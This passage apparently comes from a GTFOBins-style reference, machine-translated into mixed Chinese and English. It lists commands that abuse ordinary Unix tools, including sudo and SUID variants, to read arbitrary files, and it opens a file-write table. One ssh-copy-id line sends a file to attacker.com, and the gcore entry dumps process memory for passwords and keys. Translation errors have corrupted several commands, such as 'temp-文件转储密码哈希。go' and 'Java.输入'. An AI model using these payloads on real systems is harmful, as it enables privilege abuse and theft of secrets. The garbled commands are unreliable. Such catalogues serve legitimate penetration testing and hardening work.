bash -p -c 'echo "$(</path/to/input-file)"'
```

**方法 2:**

> **注意**: This only works interactively from an existing `bash` session.
> ⚠️ 二进制数据可能会被损坏。
```bash
HISTTIMEFORMAT=$'\r\e[K'
history -c
history -r /path/to/input-file
history
```

### `bbot`

> **注意**: The file is displayed in the debug log.
> ⚠️ 二进制数据可能会被损坏。
```bash
bbot -d -cy /path/to/input-file
```

### `bc`

> **注意**: 文件内容实际上被解析并显示为错误消息。
```bash
bc -s /path/to/input-file
quit
```

### `bconsole`

> **注意**: 文件实际上被解析，第一行错误的内容会在错误消息中返回。
```bash
bconsole -c /path/to/file-input
```

### `bridge`

> **注意**: 将文件的第一行（直到第一个空白字符）输出到标准错误的错误消息中。
```bash
bridge -b /path/to/input-file
```

### `bzip2`

> 还有许多其他工具在底层依赖 `bzip2` 例如 `bzless`, `bzcat`, `bunzip2`, 等。除了具有类似功能外，如果 `bzip2` 本身是 SUID，它们还允许特权读取。

```bash
bzip2 -c /path/to/input-file | bzip2 -d
```

### `cat`

```bash
cat /path/to/input-file
```

### `check_cups`

> 这是 `check_cups` Nagios 插件，例如在 `/usr/lib/nagios/plugins/`.

> **注意**: 读取的文件内容仅限于第一行。
> ⚠️ 二进制数据可能会被损坏。
```bash
check_cups --extra-opts=@/path/to/input-file
```

### `check_log`

> 这是 `check_log` Nagios 插件，例如在 `/usr/lib/nagios/plugins/`.

```bash
check_log -F /path/to/input-file -O /dev/stdout
```

### `check_memory`

> 这是 `check_memory` Nagios 插件，例如在 `/usr/lib/nagios/plugins/`.

> **注意**: 读取的文件内容仅限于第一行。
```bash
check_memory --extra-opts=@/path/to/input-file
```

### `check_raid`

> 这是 `check_raid` Nagios 插件，例如在 `/usr/lib/nagios/plugins/`.

> **注意**: 读取的文件内容仅限于第一行。
```bash
check_raid --extra-opts=@/path/to/input-file
```

### `check_statusfile`

> 这是 `check_statusfile` Nagios 插件，例如在 `/usr/lib/nagios/plugins/`.

> **注意**: 读取的文件内容仅限于第一行。
```bash
check_statusfile /path/to/input-file
```

### `clamscan`

> **注意**: 文件的每一行都被解释为路径，内容通过错误消息泄露。可以使用 `sed`.
> ⚠️ 二进制数据可能会被损坏。
```bash
touch x.yara
clamscan --no-summary -d x.yara -f /path/to/input-file 2>&1 | sed -nE 's/^(.*): No such file or directory$/\1/p'
```

### `cmake`

```bash
cmake -E cat /path/to/input-file
```

### `cmp`

> **注意**: 以表格格式转储输入文件中与 NUL 字节不同的字节。
> ⚠️ 二进制数据可能会被损坏。
```bash
cmp /path/to/input-file /dev/zero -b -l
```

### `column`

> **注意**: 此程序期望文本数据。
> ⚠️ 二进制数据可能会被损坏。
```bash
column /path/to/input-file
```

### `comm`

> **注意**: 文件末尾会追加一个换行符。
> ⚠️ 二进制数据可能会被损坏。
```bash
comm /path/to/input-file /dev/null
```

### `cp`

```bash
cp /path/to/input-file /dev/stdout
```

### `cpio`

**方法 1:**

> **注意**: 文件内容打印到标准输出，位于 `cpio` 归档格式头部和尾部之间。
> ⚠️ 二进制数据可能会被损坏。
```bash
echo /path/to/input-file | cpio -o
```

**方法 2:**

> **注意**: 整个目录结构被复制到 `.`, 因此这也是一种文件写入。
```bash
echo /path/to/input-file | cpio -dp .
cat path/to/input-file
```
**sudo** variant:
```bash
echo /path/to/input-file | cpio -R $UID -dp .
cat path/to/input-file
```
**suid** variant:
```bash
echo /path/to/input-file | cpio -R $UID -dp .
cat path/to/input-file
```

### `csplit`

```bash
csplit /path/to/input-file 1
cat xx01
```

### `csvtool`

> **注意**: 文件实际上被解析并作为 CSV 处理。
> ⚠️ 二进制数据可能会被损坏。
```bash
csvtool trim t /path/to/input-file
```

### `cupsfilter`

```bash
cupsfilter -i application/octet-stream -m application/octet-stream /path/to/input-file
```

### `curl`

```bash
curl file:///path/to/input-file
```

### `cut`

> ⚠️ 二进制数据可能会被损坏。
```bash
cut -d '' -f1 /path/to/input-file
```

### `date`

> **注意**: 每行都被前缀字符串损坏并包裹在引号中。
> ⚠️ 二进制数据可能会被损坏。
```bash
date -f /path/to/input-file
```

### `dd`

```bash
dd if=/path/to/input-file
```

### `dialog`

> **注意**: 文件在交互式 TUI 对话框中显示。
```bash
dialog --textbox /path/to/input-file 0 0
```

### `diff`

**方法 1:**

> ⚠️ 二进制数据可能会被损坏。
```bash
diff --line-format=%L /dev/null /path/to/input-file
```

**方法 2:**

> **注意**: 这列出目录的内容。 `/path/to/empty-dir` 可以是任何目录，但为了方便，最好使用空目录以避免噪声输出。
```bash
diff --recursive /path/to/empty-dir /path/to/input-dir/
```

### `dig`

> **注意**: 每个输入行都被视为 `dig` 命令的查找查询，输出会被操作的结果或错误损坏。
```bash
dig -f /path/to/input-file
```

### `dmesg`

> ⚠️ 二进制数据可能会被损坏。
```bash
dmesg -rF /path/to/input-file
```

### `docker`

> 这要求用户具有足够的权限来运行 `docker`, 例如在 `docker` 组中或是 `root`.

> **注意**: 通过将文件复制到临时容器 (`$CONTAINER_ID`) ，然后再复制到主机上的新位置来读取文件。
```bash
docker cp /path/to/input-file $CONTAINER_ID:input-file
docker cp $CONTAINER_ID:input-file /path/to/temp-file
cat /path/to/temp-file
```

### `dos2unix`

```bash
dos2unix -f -O /path/to/input-file
```

### `dosbox`

> Basically `dosbox` 允许挂载本地文件系统，以便可以使用 DOS 命令进行修改。请注意使用 DOS 文件名约定 ([8.3](https://en.wikipedia.org/wiki/8.3_filename)) ）。

**方法 1:**

> **注意**: 文件内容将显示在 DOSBox 图形窗口中。
```bash
dosbox -c 'mount c /' -c '输入 c:\path\to\input'
```

**方法 2:**

> **注意**: 文件被复制到可读位置。
```bash
dosbox -c 'mount c /' -c 'copy c:\path\to\input c:\path\to\output' -c exit
cat /path/to/OUTPUT
```

### `dotnet`

```bash
dotnet fsi
System.IO.File.ReadAllText("/path/to/input-file");;
```

### `ed`

> ⚠️ 二进制数据可能会被损坏。
```bash
ed /path/to/input-file
,p
q
```

### `efax`

> **注意**: The content is actually parsed by the 命令。
> ⚠️ 二进制数据可能会被损坏。
```bash
efax -d /path/to/input-file
```

### `egrep`

```bash
grep '' /path/to/input-file
```

### `elvish`

```bash
elvish -c 'print (slurp </path/to/input-file)'
```

### `emacs`

> 所有功能都在 Emacs 终端界面中操作。

> ⚠️ 二进制数据可能会被损坏。
```bash
emacs /path/to/input-file
```

### `eqn`

> **注意**: 内容实际上被命令解析和损坏。
> ⚠️ 二进制数据可能会被损坏。
```bash
eqn /path/to/input-file
```

### `espeak`

> **注意**: 文件内容以音素的形式出现在其他文本信息的中间。
> ⚠️ 二进制数据可能会被损坏。
```bash
espeak -qXf /path/to/input-file
```

### `exiftool`

> **注意**: 如果权限允许，文件会被移动（而不是复制）到目标位置。
```bash
exiftool -filename=/path/to/output-file /path/to/input-file
cat /path/to/output-file
```

### `expand`

> **注意**: 读取的文件内容通过将制表符替换为空格而被损坏。
> ⚠️ 二进制数据可能会被损坏。
```bash
expand /path/to/input-file
```

### `expect`

> **注意**: The file is read and parsed as an `expect` 命令文件，第一行无效内容在错误消息中返回。
```bash
expect /path/to/input-file
```

### `fastfetch`

> **注意**: 文件内容被用作徽标，同时在其右侧显示一些其他信息。
> ⚠️ 二进制数据可能会被损坏。
```bash
fastfetch --file /path/to/input-file
```

### `fgrep`

```bash
grep '' /path/to/input-file
```

### `file`

**方法 1:**

> **注意**: 每个输入行都被视为 `file` 命令的文件名，输出会被后缀 `:` 以及操作的结果或错误损坏。
> ⚠️ 二进制数据可能会被损坏。
```bash
file -f /path/to/input-file
```

**方法 2:**

> **注意**: 每行都被前缀字符串损坏并包裹在引号中。

如果目标文件中的某行以 `#`, 开头，则不会打印该行，因为这些行被解析为注释。

它也可以接受一个目录，并读取目录中的每个文件。
> ⚠️ 二进制数据可能会被损坏。
```bash
file -m /path/to/input-file
```

### `find`

> **注意**: This uses `cat` to actually read the file, but since permissions are not dropped, it's executed with the same privileges as `find`.
```bash
find /path/to/input-file -exec cat {} \;
```

### `fmt`

**方法 1:**

> ⚠️ 二进制数据可能会被损坏。
```bash
fmt -pNON_EXISTING_PREFIX /path/to/input-file
```

**方法 2:**

> **注意**: 这通过在给定宽度处换行来损坏输出 (`999`).
> ⚠️ 二进制数据可能会被损坏。
```bash
fmt -999 /path/to/input-file
```

### `fold`

> **注意**: 这通过在给定宽度处换行来损坏输出 (`999`).
> ⚠️ 二进制数据可能会被损坏。
```bash
fold -w999 /path/to/input-file
```

### `fping`

> **注意**: 每行都被视为主机名，并作为错误消息泄露。
> ⚠️ 二进制数据可能会被损坏。
```bash
fping -f /path/to/input-file
```

### `gawk`

```bash
gawk '//' /path/to/input-file
```

### `gcc`

**方法 1:**

> ⚠️ 二进制数据可能会被损坏。
```bash
gcc -x c -E /path/to/input-file
```

**方法 2:**

> **注意**: 文件被读取并解析为文件列表（每行一个），内容显示为错误消息。
> ⚠️ 二进制数据可能会被损坏。
```bash
gcc @/path/to/input-file
```

### `gcore`

> **注意**: It can be used to generate core dumps of running processes (`$PID`). Such files often contains sensitive information such as open files content, cryptographic keys, passwords, etc. This command produces a binary file named `core.$PID`, that is 然后 often filtered with `strings` to narrow down relevant information.
```bash
gcore $PID
```

### `genisoimage`

**方法 1:**

> **注意**: 输出被放置在 ISO9660 文件系统二进制格式中，可以使用 `7z`.
```bash
genisoimage -q -o - /path/to/input-file
```

**方法 2:**

> **注意**: 文件被解析，其部分内容通过错误消息泄露。
```bash
genisoimage -sort /path/to/input-file
```

### `git`

> **注意**: 读取的文件内容以 `diff` 样式输出格式显示。
```bash
git diff /dev/null /path/to/input-file
```

### `go`

```bash
echo -e 'package main\nimport (\n\t"fmt"\n\t"os"\n)\n\nfunc main(){\n\tb, _ := os.ReadFile("/path/to/input-file")\n\tfmt.Print(string(b))\n}' >/path/to/temp-文件转储密码哈希。go
go run /path/to/temp-文件转储密码哈希。go
```

### `grep`

> ⚠️ 二进制数据可能会被损坏。
```bash
grep '' /path/to/input-file
```

### `gzip`

> 还有许多其他工具在底层依赖 `gzip` 例如 `zless`, `zcat`, `gunzip`, 等。除了具有类似功能外，如果 `gzip` 本身是 SUID，它们还允许特权读取。

```bash
gzip -c /path/to/input-file | gzip -d
```

### `head`

```bash
head -c-0 /path/to/input-file
```

### `hexdump`

> **注意**: 输出实际上是十六进制转储。
```bash
hd /path/to/input-file
```

### `highlight`

> ⚠️ 二进制数据可能会被损坏。
```bash
highlight --no-doc --failsafe /path/to/input-file
```

### `iconv`

> The `8859_1` 编码被使用，因为它接受任何单字节序列，因此允许读取/写入任意文件。其他编码组合可能会损坏结果。

```bash
iconv -f 8859_1 -t 8859_1 /path/to/input-file
```

### `ip`

> **注意**: 读取的文件内容被错误打印损坏。
> ⚠️ 二进制数据可能会被损坏。
```bash
ip -force -batch /path/to/input-file
```

### `jjs`

> 此工具从 Java SE 8 开始安装。

```bash
jjs
var BufferedReader = Java.输入('java.io.BufferedReader');
var FileReader = Java.输入('java.io.FileReader');
var br = new BufferedReader(new FileReader('/path/to/input-file'));
while ((line = br.readLine()) != null) { print(line); }
```

### `join`

> ⚠️ 二进制数据可能会被损坏。
```bash
join -a 2 /dev/null /path/to/input-file
```

### `jq`

> ⚠️ 二进制数据可能会被损坏。
```bash
jq -Rr . /path/to/input-file
```

### `jrunscript`

> 此工具从 Java SE 6 开始安装。

> ⚠️ 二进制数据可能会被损坏。
```bash
jrunscript -e 'br = new BufferedReader(new java.io.FileReader("/path/to/input-file"));
    while ((line = br.readLine()) != null) { print(line); }'
```

### `jshell`

> **注意**: The content is leaked as error messages.
> ⚠️ 二进制数据可能会被损坏。
```bash
jshell
jshell> /open /path/to/input-file
```

### `julia`

```bash
julia -e 'print(open(f->read(f, String), "/path/to/input-file"))'
```

### `ksshell`

> **注意**: Each line is corrupted by a prefix string. Also consider that lines are actually parsed as `kickstart` scripts thus some file contents may lead to unexpected results.
```bash
ksshell -i /path/to/input-file
```

### `last`

> **注意**: 如果文件不符合预期的数据库格式，输出可能会损坏或不完整。
```bash
last -a -f /path/to/input-file
```

### `latex`

> **注意**: 读取的文件将成为 PDF 输出的一部分。
```bash
latex '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{/path/to/input-file}\end{document}'
strings texput.dvi
```

### `latexmk`

> **注意**: The read file will be part of the output.
> ⚠️ 二进制数据可能会被损坏。
```bash
echo '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{/path/to/input-file}\end{document}' >/path/to/temp-file
latexmk -dvi /path/to/temp-file
strings temp-文件转储密码哈希。dvi
```

### `less`

**方法 1:**

```bash
less /path/to/input-file
```

**方法 2:**

> **注意**: 这可用于读取另一个文件，例如当作为分页器调用时具有某些固定内容。
```bash
less /etc/hosts
:e /path/to/input-file
```

**方法 3:**

> **注意**: 这可用于读取另一个文件。
```bash
LESSOPEN='echo /path/to/input-file # %s' less /etc/hosts
```

### `links`

> **注意**: 结果显示在 TUI 界面中。
> ⚠️ 二进制数据可能会被损坏。
```bash
links /path/to/input-file
```

### `logrotate`

> **注意**: 第一个单词在错误消息中返回。
> ⚠️ 二进制数据可能会被损坏。
```bash
logrotate /path/to/input-file
```

### `look`

```bash
look '' /path/to/input-file
```

### `ltrace`

> **注意**: The file is parsed as a configuration file and its content is shown as error messages.
> ⚠️ 二进制数据可能会被损坏。
```bash
ltrace -F /path/to/input-file /dev/null
```

### `lua`

```bash
lua -e 'local f=io.open("/path/to/input-file", "rb"); io.write(f:read("*a")); io.close(f);'
```

### `lwp-download`

```bash
lwp-download file:///path/to/input-file /dev/stdout
```

### `lwp-request`

```bash
lwp-request file:///path/to/input-file
```

### `m4`

> ⚠️ 二进制数据可能会被损坏。
```bash
m4 /path/to/input-file
```

### `make`

> ⚠️ 二进制数据可能会被损坏。
```bash
make -s --eval='$(file >/dev/stdout,$(file </path/to/input-file))' .
```

### `man`

> **注意**: The file is shown somehow formatted and displayed in the default pager.
```bash
man /path/to/input-file
```

### `mawk`

```bash
mawk '//' /path/to/input-file
```

### `more`

> **注意**: The file is displayed in the terminal interface.
```bash
more /path/to/input-file
```

### `mosquitto`

> **注意**: The file is actually parsed and the first wrong line (ending with a newline or a null character) is returned in an error message.
```bash
mosquitto -c /path/to/input-file
```

### `msgattrib`

> **注意**: The file is parsed and displayed as a Java `.properties` 文件转储密码哈希。
> ⚠️ 二进制数据可能会被损坏。
```bash
msgattrib -P /path/to/input-file
```

### `msgcat`

> **注意**: The file is parsed and displayed as a Java `.properties` 文件转储密码哈希。
> ⚠️ 二进制数据可能会被损坏。
```bash
msgcat -P /path/to/input-file
```

### `msgconv`

> **注意**: The file is parsed and displayed as a Java `.properties` 文件转储密码哈希。
> ⚠️ 二进制数据可能会被损坏。
```bash
msgconv -P /path/to/input-file
```

### `msgfilter`

> **注意**: 文件被解析并显示为 Java `.properties` 文件。`/bin/cat` 可以替换为任何其他*过滤器*程序。
> ⚠️ 二进制数据可能会被损坏。
```bash
msgfilter -P -i /path/to/input-file /bin/cat
```

### `msgmerge`

> **注意**: The file is parsed and displayed as a Java `.properties` 文件转储密码哈希。
> ⚠️ 二进制数据可能会被损坏。
```bash
msgmerge -P /path/to/input-file /dev/null
```

### `msguniq`

> **注意**: The file is parsed and displayed as a Java `.properties` 文件转储密码哈希。
> ⚠️ 二进制数据可能会被损坏。
```bash
msguniq -P /path/to/input-file
```

### `mtr`

> **注意**: 文件实际上被解析，因此内容被错误打印损坏。
> ⚠️ 二进制数据可能会被损坏。
```bash
mtr --raw -F /path/to/input-file
```

### `mutt`

> **注意**: 文件作为错误消息泄露。
> ⚠️ 二进制数据可能会被损坏。
```bash
mutt -F /path/to/input-file
```

### `mypy`

> **注意**: 部分内容作为错误消息泄露。
> ⚠️ 二进制数据可能会被损坏。
```bash
mypy /path/to/input-file
```

### `nano`

> **注意**: The file content is displayed in the terminal interface.
> ⚠️ 二进制数据可能会被损坏。
```bash
nano /path/to/input-file
```

### `nasm`

> **注意**: 文件内容被视为命令行选项，并通过错误消息泄露。
```bash
nasm -@ /path/to/input-file
```

### `neofetch`

> **注意**: 文件内容被用作徽标，同时在其右侧显示一些其他信息。
> ⚠️ 二进制数据可能会被损坏。
```bash
neofetch --ascii /path/to/input-file
```

### `nft`

> **注意**: 内容实际上被命令解析和损坏。
```bash
nft -f /path/to/input-file
```

### `nl`

> **注意**: The read file content is corrupted by a leading space added to each line.
> ⚠️ 二进制数据可能会被损坏。
```bash
nl -bn -w1 -s '' /path/to/input-file
```

### `nm`

> **注意**: The file content is treated as command line options and disclosed through error messages.
> ⚠️ 二进制数据可能会被损坏。
```bash
nm /path/to/input-file
```

### `nmap`

> **注意**: 文件实际上被解析为主机/网络列表，行通过错误消息泄露。
> ⚠️ 二进制数据可能会被损坏。
```bash
nmap -iL /path/to/input-file
```

### `node`

```bash
node -e 'process.stdout.write(require("fs").readFileSync("/path/to/input-file"))'
```

### `nroff`

> **注意**: The file is 输入set and some warning messages may appear.
> ⚠️ 二进制数据可能会被损坏。
```bash
nroff /path/to/input-file
```

### `ntpdate`

> **注意**: 文件实际上被解析，行通过错误消息泄露。
> ⚠️ 二进制数据可能会被损坏。
```bash
ntpdate -a x -k /path/to/input-file -d localhost
```

### `octave`

> The payloads are compatible with GUI mode.

> ⚠️ 二进制数据可能会被损坏。
```bash
octave-cli --eval 'format none; fid = fopen("/path/to/input-file"); while(!feof(fid)); txt = fgetl(fid); disp(txt); endwhile; fclose(fid);'
```

### `od`

> **注意**: 在读取文件的每个字符前添加三个空格（在指定值处换行，即 `999`），不可打印字符以反斜杠转义序列打印。
```bash
od -An -c -w999 /path/to/input-file
```

### `openssl`

```bash
openssl enc -in /path/to/input-file
```

### `openvpn`

> **注意**: 文件实际上被解析，第一行部分错误的内容在错误消息中返回。
```bash
openvpn --config /path/to/input-file
```

### `pandoc`

> ⚠️ 二进制数据可能会被损坏。
```bash
pandoc -t plain /path/to/input-file
```

### `paste`

> ⚠️ 二进制数据可能会被损坏。
```bash
paste /path/to/input-file
```

### `pax`

```bash
pax -w /path/to/input-file | tar -xO
```

### `pdflatex`

> **注意**: 读取的文件将成为 PDF 输出的一部分。
```bash
pdflatex '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{/path/to/input-file}\end{document}'
pdftotext texput.pdf -
```

### `perl`

```bash
perl -ne print /path/to/input-file
```

### `pg`

```bash
pg /path/to/input-file
```

### `php`

```bash
php -r 'readfile("/path/to/input-file");'
```

### `pic`

> **注意**: The output is prefixed with some content.
> ⚠️ 二进制数据可能会被损坏。
```bash
pic /path/to/input-file
```

### `pr`

> ⚠️ 二进制数据可能会被损坏。
```bash
pr -T /path/to/input-file
```

### `ptx`

> 虽然程序能够读取文件，但它输出内容的"置换索引"，从而改变了内容。调整选项可能会产生更可读的输出。

> ⚠️ 二进制数据可能会被损坏。
```bash
ptx -w 999 /path/to/input-file
```

### `puppet`

> **注意**: 读取的文件内容被 `diff` 输出格式损坏。实际执行了 `diff` 命令。
```bash
puppet filebucket -l diff /dev/null /path/to/input-file
```

### `pygmentize`

> ⚠️ 二进制数据可能会被损坏。
```bash
pygmentize -l text /path/to/input-file
```

### `pyright`

**方法 1:**

> **注意**: Content is leaked as error messages.
> ⚠️ 二进制数据可能会被损坏。
```bash
pyright /path/to/input-file
```

**方法 2:**

> **注意**: Content is leaked as error messages in JSON format.
> ⚠️ 二进制数据可能会被损坏。
```bash
pyright --outputjson /path/to/input-file
```

**方法 3:**

> **注意**: 递归遍历目录，解析所有 Python 文件并通过诊断泄露一些内容。
```bash
pyright -w /path/to/input-dir/
```

### `python`

> 这些载荷兼容 Python 2 和 3 版本。

```bash
python -c 'print(open("/path/to/input-file").read())'
```

### `qpdf`

```bash
qpdf --empty --add-attachment /path/to/input-file --key=x -- /path/to/output-file
qpdf --show-attachment=x /path/to/output-file
```

### `rake`

> **注意**: 文件实际上被解析，第一行错误的内容会在错误消息中返回。
```bash
rake -f /path/to/input-file
```

### `readelf`

> **注意**: Each line is corrupted by a prefix string and wrapped inside single quotes. Also consider that lines are actually parsed as `readelf` options thus some file contents may lead to unexpected results.
> ⚠️ 二进制数据可能会被损坏。
```bash
readelf -a @/path/to/input-file
```

### `redcarpet`

> **注意**: 文件实际上被解析为 Markdown 文件。
> ⚠️ 二进制数据可能会被损坏。
```bash
redcarpet /path/to/input-file
```

### `rev`

> ⚠️ 二进制数据可能会被损坏。
```bash
rev /path/to/input-file | rev
```

### `ruby`

```bash
ruby -e 'puts File.read("/path/to/input-file")'
```

### `rustc`

> **注意**: 编译器在编译器错误中泄露了一些文件行。
> ⚠️ 二进制数据可能会被损坏。
```bash
rustc /path/to/input-file
```

### `rustdoc`

> **注意**: 部分内容显示为错误消息。
> ⚠️ 二进制数据可能会被损坏。
```bash
rustdoc /path/to/input-file
```

### `rustfmt`

> **注意**: 部分内容显示为错误消息。
> ⚠️ 二进制数据可能会被损坏。
```bash
rustfmt /path/to/input-file
```

### `sed`

```bash
sed '' /path/to/input-file
```

### `shuf`

> **注意**: The read file content is corrupted by randomizing the order of NUL terminated strings.
```bash
shuf -z /path/to/input-file
```

### `socat`

```bash
socat -u file:/path/to/input-file -
```

### `soelim`

> **注意**: 内容实际上被命令解析和损坏。
> ⚠️ 二进制数据可能会被损坏。
```bash
soelim /path/to/input-file
```

### `sort`

> ⚠️ 二进制数据可能会被损坏。
```bash
sort -m /path/to/input-file
```

### `split`

> **注意**: 这将输入文件复制到当前工作目录中名为 `prefixaasuffix`, just make sure to pick a value big enough, 指定不同的前缀（而不是 `999`.
```bash
split -b 999 --additional-suffix suffix /path/to/input-file prefix
cat prefixaasuffix
```

### `sqlite3`

> ⚠️ 二进制数据可能会被损坏。
```bash
sqlite3 <<EOF
CREATE TABLE x(x TEXT);
.import /path/to/input-file x
SELECT * FROM x;
EOF
```

### `ss`

> **注意**: 文件内容实际上被解析，因此只有第一行的一部分作为错误消息的一部分返回。
> ⚠️ 二进制数据可能会被损坏。
```bash
ss -a -F /path/to/input-file
```

### `ssh`

> **注意**: 读取的文件内容被错误打印损坏。
```bash
ssh -F /path/to/input-file x
```

### `ssh-copy-id`

> **注意**: The input file must have the `.pub` file extension. The file will be copied to `~/.ssh/authorized_keys`, otherwise the `-t /path/to/output-file` option can be used.
```bash
ssh-copy-id -f -i /path/to/input-文件转储密码哈希。pub user@attacker.com
```

### `ssh-keyscan`

> **注意**: The file content is actually parsed so only a part of each line is returned as a part of an error message.
```bash
ssh-keyscan -f /path/to/input-file
```

### `strings`

> **注意**: 这只返回 ASCII 字符串。
> ⚠️ 二进制数据可能会被损坏。
```bash
strings /path/to/input-file
```

### `sysctl`

> ⚠️ 二进制数据可能会被损坏。
```bash
sysctl -n "/../../path/to/input-file"
```

### `tac`

> **注意**: 确保 `RANDOM` 不出现在要读取的文件中，否则文件内容会通过反转 `RANDOM`-分隔的块的顺序而被损坏。
> ⚠️ 二进制数据可能会被损坏。
```bash
tac -s 'RANDOM' /path/to/input-file
```

### `tail`

```bash
tail -c+0 /path/to/input-file
```

### `tar`

> **注意**: The file is read 然后 passed to the specified command (e.g., `tar xO`) ）。
```bash
tar cf /dev/stdout /path/to/input-file -I 'tar xO'
```

### `tbl`

> **注意**: 读取的文件内容开头被额外文本损坏。
> ⚠️ 二进制数据可能会被损坏。
```bash
tbl /path/to/input-file
```

### `terraform`

> ⚠️ 二进制数据可能会被损坏。
```bash
terraform console
file("/path/to/input-file")
```

### `tic`

> **注意**: 这将 terminfo 文件从源格式转换为编译格式。它将尝试转换任意文件，并在失败时输出文件内容。
```bash
tic -C /path/to/input-file
```

### `tmux`

> **注意**: The file is read and parsed as a `tmux` 配置文件，第一行无效内容的一部分会在错误消息中返回。
> ⚠️ 二进制数据可能会被损坏。
```bash
tmux -f /path/to/input-file
```

### `troff`

> **注意**: The file is 输入set but text is still readable in the output, alternatively the output can be read with `man -l`.
> ⚠️ 二进制数据可能会被损坏。
```bash
troff /path/to/input-file
```

### `tsc`

> **注意**: Content is leaked as error messages. The file extension must be one of the supported ones, e.g., `.ts`, `.tsx`, etc.
> ⚠️ 二进制数据可能会被损坏。
```bash
tsc /path/to/input-文件转储密码哈希。ts
```

### `ul`

> **注意**: 读取的文件内容通过将 `$'\b_'` 的出现替换为终端序列并将制表符转换为空格而被损坏。
> ⚠️ 二进制数据可能会被损坏。
```bash
ul /path/to/input-file
```

### `unexpand`

> **注意**: 将（例如 `999`) 个）空格序列转换为制表符。
> ⚠️ 二进制数据可能会被损坏。
```bash
unexpand -t999 /path/to/input-file
```

### `uniq`

> **注意**: 读取的文件内容通过压缩多个相邻行而被损坏。
> ⚠️ 二进制数据可能会被损坏。
```bash
uniq /path/to/input-file
```

### `urlget`

> **注意**: This is part of `gettext` 的一部分，通常不在 `PATH`, 中，例如在 Arch 上可以在 `/usr/lib/gettext/urlget`.
```bash
urlget - /path/to/input-file
```

### `uuencode`

> ⚠️ 二进制数据可能会被损坏。
```bash
uuencode /path/to/input-file /dev/stdout | uudecode
```

### `vi`

```bash
vi /path/to/input-file
```

### `vim`

> ⚠️ 二进制数据可能会被损坏。
```bash
vim -c ':redir! >/path/to/output-file | echo "DATA" | redir END | q'
```

### `w3m`

> ⚠️ 二进制数据可能会被损坏。
```bash
w3m -dump /path/to/input-file
```

### `wall`

> **注意**: 文本文件被转储到当前 TTY（既不是 `stdout` 也不是 `stderr`).
> ⚠️ 二进制数据可能会被损坏。
```bash
wall --nobanner /path/to/input-file
```

### `wc`

> **注意**: The file content is parsed as a sequence of `\x00` separated paths. On error the file content appears in a message.
> ⚠️ 二进制数据可能会被损坏。
```bash
wc --files0-from /path/to/input-file
```

### `wget`

> **注意**: 要读取的文件被视为 URL 列表，每行一个， `wget`. 实际上会获取这些 URL。内容会以某种修改后的形式作为错误消息出现。
> ⚠️ 二进制数据可能会被损坏。
```bash
wget -i /path/to/input-file
```

### `whiptail`

> **注意**: 文件在用于显示文本的交互式 TUI 对话框中显示，可以使用箭头滚动长内容。
> ⚠️ 二进制数据可能会被损坏。
```bash
whiptail --textbox --scrolltext /path/to/input-file 0 0
```

### `xargs`

> ⚠️ 二进制数据可能会被损坏。
```bash
xargs -a /path/to/input-file -0
```

### `xmodmap`

> 这需要一个正在运行的 X 服务器。

> **注意**: 读取的文件内容被错误打印损坏。
> ⚠️ 二进制数据可能会被损坏。
```bash
xmodmap -v /path/to/input-file
```

### `xmore`

> 这需要一个正在运行的 X 服务器。

> **注意**: 文件在图形窗口中显示。
```bash
xmore /path/to/input-file
```

### `xpad`

> 这需要一个正在运行的 X 服务器。

> **注意**: 文件在图形窗口中显示。
```bash
xpad -f /path/to/input-file
```

### `xxd`

```bash
xxd /path/to/input-file | xxd -r
```

### `xz`

```bash
xz -c /path/to/input-file | xz -d
```

### `yelp`

> **注意**: 这会生成一个图形窗口，其中包含的文件内容会被自动换行以某种方式损坏。
```bash
yelp man:/path/to/input-file
```

### `zcat`

```bash
zcat -f /path/to/input-file
```

### `zgrep`

```bash
grep '' /path/to/input-file
```

### `zip`

```bash
zip /path/to/temp-file /path/to/input-file
unzip -p /path/to/temp-file
```

### `zsh`

**方法 1:**

> ⚠️ 二进制数据可能会被损坏。
```bash
zsh -c 'echo "$(</path/to/input-file)"'
```

**方法 2:**

> **注意**: This spawns a pager if run in a TTY.
```bash
zsh -c '</path/to/input-file'
```

### `zsoelim`

> **注意**: 内容实际上被命令解析和损坏。
> ⚠️ 二进制数据可能会被损坏。
```bash
zsoelim /path/to/input-file
```

---

## File write (file-write)

> 该可执行文件可以向本地文件写入数据。

共 **84** 个工具支持此功能。

| # | 工具名 | 示例数 | 权限上下文 |
|---|--------|--------|-----------|
| 1 | `arj` | 1 | sudo, suid, unprivileged |
| 2 | `ash` | 1 | sudo, suid, unprivileged |
| 3 | `bash` | 2 | sudo, suid, unprivileged |
| 4 | `check_log` | 1 | sudo, unprivileged |
| 5 | `cp` | 1 | sudo, suid, unprivileged |
| 6 | `cpio` | 1 | sudo, suid, unprivileged |
| 7 | `csh` | 1 | sudo, suid, unprivileged |
| 8 | `csplit` | 1 | sudo, suid, unprivileged |
| 9 | `csvtool` | 1 | sudo, suid, unprivileged |
| 10 | `curl` | 1 | sudo, suid, unprivileged |
| 11 | `dash` | 1 | sudo, suid, unprivileged |
| 12 | `dd` | 1 | sudo, suid, unprivileged |
| 13 | `dmidecode` | 1 | unprivileged |
| 14 | `docker` | 1 | sudo, suid, unprivileged |
| 15 | `dos2unix` | 1 | sudo, suid, unprivileged |
| 16 | `dosbox` | 1 | sudo, suid, unprivileged |
| 17 | `ed` | 1 | sudo, suid, unprivileged |
| 18 | `elvish` | 1 | sudo, suid, unprivileged |
| 19 | `emacs` | 1 | sudo, unprivileged |
| 20 | `exiftool` | 4 | sudo, unprivileged |
| 21 | `find` | 1 | sudo, suid, unprivileged |
| 22 | `gawk` | 1 | sudo, suid, unprivileged |
| 23 | `gcc` | 1 | sudo, unprivileged |
| 24 | `gdb` | 1 | sudo, suid, unprivileged |
| 25 | `git` | 1 | sudo, suid, unprivileged |
| 26 | `go` | 1 | sudo, unprivileged |
| 27 | `gtester` | 1 | sudo, suid, unprivileged |
| 28 | `hashcat` | 1 | sudo, unprivileged |
| 29 | `iconv` | 1 | sudo, suid, unprivileged |
| 30 | `iptables-save` | 1 | sudo |
| 31 | `jjs` | 1 | sudo, unprivileged |
| 32 | `jrunscript` | 1 | sudo, unprivileged |
| 33 | `jshell` | 1 | sudo, unprivileged |
| 34 | `julia` | 1 | sudo, suid, unprivileged |
| 35 | `latex` | 1 | sudo, suid, unprivileged |
| 36 | `less` | 1 | sudo, suid, unprivileged |
| 37 | `logrotate` | 1 | sudo, suid, unprivileged |
| 38 | `ltrace` | 1 | sudo, unprivileged |
